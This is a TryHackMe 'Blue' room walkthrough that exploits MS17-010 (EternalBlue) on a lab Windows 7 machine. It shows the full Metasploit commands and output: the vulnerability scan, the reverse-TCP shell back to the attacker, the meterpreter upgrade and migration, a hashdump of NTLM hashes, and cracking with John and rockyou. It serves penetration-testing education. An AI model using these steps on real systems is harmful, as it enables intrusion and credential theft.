# Blue

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Walkthrough
Difficulty: Easy
OS: N/A
Subscription type: Free
Description: Deploy & hack into a Windows machine, leveraging common misconfigurations issues.
```

Room link: [https://tryhackme.com/room/blue](https://tryhackme.com/room/blue)

## Solution

### Task 1: Recon

Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused.

The virtual machine used in this room (Blue) can be downloaded for offline usage from [https://darkstar7471.com/resources.html](https://darkstar7471.com/resources.html)

#### Scan the machine

Hint: Command: nmap -sV -vv --script vuln TARGET_IP

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Blue]
└─$ nmap -sV -vv --script vuln 10.10.225.121
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-26 14:43 CEST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 14:43
NSE Timing: About 66.67% done; ETC: 14:44 (0:00:15 remaining)
Completed NSE at 14:44, 34.93s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 14:44
Completed NSE at 14:44, 0.00s elapsed
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Initiating Ping Scan at 14:44
Scanning 10.10.225.121 [4 ports]
Completed Ping Scan at 14:44, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:44
Completed Parallel DNS resolution of 1 host. at 14:44, 0.11s elapsed
Initiating SYN Stealth Scan at 14:44
Scanning 10.10.225.121 [1000 ports]
Discovered open port 139/tcp on 10.10.225.121
Discovered open port 3389/tcp on 10.10.225.121
Discovered open port 135/tcp on 10.10.225.121
Discovered open port 445/tcp on 10.10.225.121
Discovered open port 49154/tcp on 10.10.225.121
Discovered open port 49153/tcp on 10.10.225.121
Discovered open port 49152/tcp on 10.10.225.121
Discovered open port 49158/tcp on 10.10.225.121
Discovered open port 49160/tcp on 10.10.225.121
Completed SYN Stealth Scan at 14:44, 1.95s elapsed (1000 total ports)
Initiating Service scan at 14:44
Scanning 9 services on 10.10.225.121
Service scan Timing: About 55.56% done; ETC: 14:46 (0:00:44 remaining)
Completed Service scan at 14:45, 60.37s elapsed (9 services on 1 host)
NSE: Script scanning 10.10.225.121.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 14:45
NSE Timing: About 99.91% done; ETC: 14:46 (0:00:00 remaining)
Completed NSE at 14:46, 60.39s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 14:46
NSE: [ssl-ccs-injection 10.10.225.121:3389] No response from server: ERROR
Completed NSE at 14:46, 1.87s elapsed
Nmap scan report for 10.10.225.121
Host is up, received reset ttl 127 (0.046s latency).
Scanned at 2025-04-26 14:44:27 CEST for 125s
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      REASON          VERSION
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped   syn-ack ttl 127
|_ssl-ccs-injection: No reply from server (TIMEOUT)
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49158/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49160/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 14:46
Completed NSE at 14:46, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 14:46
Completed NSE at 14:46, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 160.29 seconds
           Raw packets sent: 1030 (45.296KB) | Rcvd: 1001 (40.076KB)
```

#### How many ports are open with a port number under 1000?

Hint: Near the top of the nmap output: PORT STATE SERVICE

From output above

Answer: 3

#### What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

Hint: Revealed by the ShadowBrokers, exploits an issue within SMBv1

From output above

Answer: ms17-010

### Task 2: Gain Access

Exploit the machine and gain a foothold.

#### Start Metasploit

Hint: Command: msfconsole

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Blue]
└─$ msfconsole                              
Metasploit tip: You can use help to view all available commands
                                                  

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,      
                      .

       =[ metasploit v6.4.50-dev                          ]
+ -- --=[ 2496 exploits - 1283 auxiliary - 431 post       ]
+ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > 
```

#### Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

Hint: search ms??

```bash
msf6 > search ms17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .


Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'

msf6 > use 2
[*] Additionally setting TARGET => Windows 7
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```

Answer: exploit/windows/smb/ms17_010_eternalblue

#### Show options and set the one required value. What is the name of this value? (All caps for submission)

Hint: Command: show options

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target m
                                             achines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machi
                                             nes.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.111.242.159   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.225.121
RHOSTS => 10.10.225.121
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.14.61.233
LHOST => 10.14.61.233
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```

Answer: RHOSTS

#### Run the exploit

Hint: Command: run (or exploit)

Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:

`set payload windows/x64/shell/reverse_tcp`

With that done, run the exploit!

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
[*] Started reverse TCP handler on 10.14.61.233:4444 
[*] 10.10.225.121:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.225.121:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.225.121:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.225.121:445 - The target is vulnerable.
[*] 10.10.225.121:445 - Connecting to target for exploitation.
[+] 10.10.225.121:445 - Connection established for exploitation.
[+] 10.10.225.121:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.225.121:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.225.121:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.225.121:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.225.121:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.225.121:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.225.121:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.225.121:445 - Sending all but last fragment of exploit packet
[*] 10.10.225.121:445 - Starting non-paged pool grooming
[+] 10.10.225.121:445 - Sending SMBv2 buffers
[+] 10.10.225.121:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.225.121:445 - Sending final SMBv2 buffers.
[*] 10.10.225.121:445 - Sending last fragment of exploit packet!
[*] 10.10.225.121:445 - Receiving response from exploit packet
[+] 10.10.225.121:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.225.121:445 - Sending egg to corrupted connection.
[*] 10.10.225.121:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 10.10.225.121
[*] Meterpreter session 1 opened (10.14.61.233:4444 -> 10.10.225.121:49214) at 2025-04-26 15:08:14 +0200
[+] 10.10.225.121:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.225.121:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.225.121:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > 
```

### Task 3: Escalate

Escalate privileges, learn how to upgrade shells in metasploit.

Research online how to convert a shell to meterpreter shell in metasploit.

#### What is the name of the post module we will use?

Hint: Google this: shell_to_meterpreter

Answer: post/multi/manage/shell_to_meterpreter

#### Select this (use MODULE_PATH). Show options, what option are we required to change?

```bash
meterpreter > 
Background session 1? [y/N]  
msf6 exploit(windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(multi/manage/shell_to_meterpreter) > 
```

Answer: SESSION

#### Set the required option, you may need to list all of the sessions to find your target here

Hint: sessions -l

We already have a meterpreter session but let's continue to practice anyway

```bash
msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/shell_to_meterpreter) > run
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.14.61.233:4433 
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (203846 bytes) to 10.10.225.121
[*] Meterpreter session 2 opened (10.14.61.233:4433 -> 10.10.225.121:49223) at 2025-04-26 15:15:42 +0200
[*] Stopping exploit/multi/handler

msf6 post(multi/manage/shell_to_meterpreter) > 
```

#### Once the meterpreter shell conversion completes, select that session for use

Hint: sessions SESSION_NUMBER

```bash
msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > 
```

#### Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this

```bash
meterpreter > getsystem
[-] Already running as SYSTEM
meterpreter > 
```

#### List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column)

```bash
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 100   696   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 488   696   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 548   540   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 596   540   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 604   696   taskhost.exe          x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\taskhost.exe
 608   588   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 648   588   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 696   596   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 704   596   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 712   596   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 820   696   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 888   696   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 936   696   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1004  648   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 1064  696   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1160  696   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 1240  792   powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 1284  696   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1320  696   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1384  696   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1460  696   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 1600  696   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1712  696   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
 1752  696   VSSVC.exe             x64   0        NT AUTHORITY\SYSTEM
 1796  820   WmiPrvSE.exe
 1936  696   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 2016  696   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
 2164  820   WmiPrvSE.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wbem\wmiprvse.exe
 2376  696   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 2604  696   vds.exe               x64   0        NT AUTHORITY\SYSTEM
 2692  696   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 2748  696   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
 2860  696   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 2908  548   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
```

Selected PID 648.

#### Migrate to this process using the 'migrate PROCESS_ID'

```bash
meterpreter > migrate 648
[*] Migrating from 1240 to 648...
[*] Migration completed successfully.
meterpreter > 
```

### Task 4: Cracking

Dump the non-default user's password and crack it!

#### Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
meterpreter > 
```

Answer: Jon

#### Copy this password hash to a file and research how to crack it. What is the cracked password?

Hint: This password can be found within the rockyou.txt wordlist

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Blue]
└─$ echo 'ffb43f0de35be4d9917ac0cc8ad57f8d' > Jon_hash.txt

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Easy/Blue]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=nt Jon_hash.txt         
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (?)     
1g 0:00:00:00 DONE (2025-04-26 15:27) 1.754g/s 17895Kp/s 17895Kc/s 17895KC/s alqui..alpusidi
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed. 
```

Answer: alqfna22

### Task 5: Find flags

Find the three flags planted on this machine. These are not traditional flags, rather, they're meant to represent key locations within the Windows system. Use the hints provided below to complete this room!

#### Flag1? This flag can be found at the system root

Hint: Can you C it?

```bash
meterpreter > shell
Process 2944 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>where /R C:\ flag1*
where /R C:\ flag1*
C:\flag1.txt
C:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag1.lnk

C:\Windows\system32>type C:\flag1.txt
type C:\flag1.txt
flag{<REDACTED>}
C:\Windows\system32> 
```

Answer: `flag{<REDACTED>}`

#### Flag2? This flag can be found at the location where passwords are stored within Windows

Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.

Hint: I wish I wrote down where I kept my password. Luckily it's still stored here on Windows.

```bash
C:\Windows\system32>where /R C:\ flag2*
where /R C:\ flag2*
C:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag2.lnk
C:\Windows\System32\config\flag2.txt

C:\Windows\system32>type C:\Windows\System32\config\flag2.txt
type C:\Windows\System32\config\flag2.txt
flag{<REDACTED>}
C:\Windows\system32>
```

Answer: `flag{<REDACTED>}`

#### flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved

Hint: You'll need to have elevated privileges to access this flag.

```bash
C:\Windows\system32>where /R C:\ flag3*
where /R C:\ flag3*
C:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag3.lnk
C:\Users\Jon\Documents\flag3.txt

C:\Windows\system32>type C:\Users\Jon\Documents\flag3.txt
type C:\Users\Jon\Documents\flag3.txt
flag{<REDACTED>}
C:\Windows\system32>
```

Answer: `flag{<REDACTED>}`

For additional information, please see the references below.

## References

- [EternalBlue - Wikipedia](https://en.wikipedia.org/wiki/EternalBlue)
- [exploit/windows/smb/ms17_010_eternalblue -  Metasploit-Framework](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/ms17_010_eternalblue.md)
- [Metasploit - Documentation](https://docs.metasploit.com/)
- [Metasploit - Homepage](https://www.metasploit.com/)
- [Metasploit - Wikipedia](https://en.wikipedia.org/wiki/Metasploit)
- [Metasploit-Framework - Kali Tools](https://www.kali.org/tools/metasploit-framework/)
- [Meterpreter - Metasploit Documentation](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/)
- [Meterpreter Basics - Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/meterpreter-basics/)
- [MS17-010 - Microsoft](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010)
- [Server Message Block - Wikipedia](https://en.wikipedia.org/wiki/Server_Message_Block)
